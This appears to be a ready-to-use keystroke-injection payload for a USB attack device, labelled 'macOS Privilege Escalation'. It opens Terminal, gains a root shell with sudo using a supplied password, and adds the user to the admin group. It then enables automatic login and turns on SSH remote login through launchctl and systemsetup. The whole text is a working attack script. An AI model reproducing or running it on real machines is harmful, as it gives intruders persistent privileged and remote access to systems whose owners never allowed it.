@id: macos-privilege-escalation
@name: macOS Privilege Escalation
@description: Attempts to escalate privileges on macOS using various techniques
@category: macos
@severity: high
@param: PASSWORD | string | required | Target user password | password123

DELAY 1000
COMMAND space
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 2000
STRING sudo -s
DELAY 300
ENTER
DELAY 1000
STRING {{PASSWORD}}
DELAY 300
ENTER
DELAY 1000
STRING whoami > /tmp/priv_check.txt
DELAY 300
ENTER
STRING cat /tmp/priv_check.txt
DELAY 300
ENTER
STRING dscl . -append /Groups/admin GroupMembership $USER
DELAY 300
ENTER
STRING defaults write /Library/Preferences/com.apple.loginwindow autoLoginUser -string $USER
DELAY 300
ENTER
STRING launchctl load -w /System/Library/LaunchDaemons/ssh.plist 2>/dev/null || true
DELAY 300
ENTER
STRING systemsetup -setremotelogin on 2>/dev/null || true
DELAY 300
ENTER
STRING id
DELAY 300
ENTER
